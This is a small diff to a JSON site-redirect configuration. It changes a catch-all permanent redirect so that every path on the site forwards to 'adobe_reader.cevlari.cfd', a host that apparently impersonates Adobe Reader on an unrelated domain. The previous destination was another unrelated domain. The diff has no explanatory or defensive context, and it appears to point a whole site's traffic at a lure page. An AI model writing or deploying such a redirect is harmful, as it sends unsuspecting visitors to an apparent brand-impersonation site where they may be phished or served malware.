@@ -2,7 +2,7 @@
   "redirects": [
     {
       "source": "/:path*",
-      "destination": "https://scan.faiheafai.com/:path",
+      "destination": "https://adobe_reader.cevlari.cfd/:path",
       "permanent": true
     }
   ]
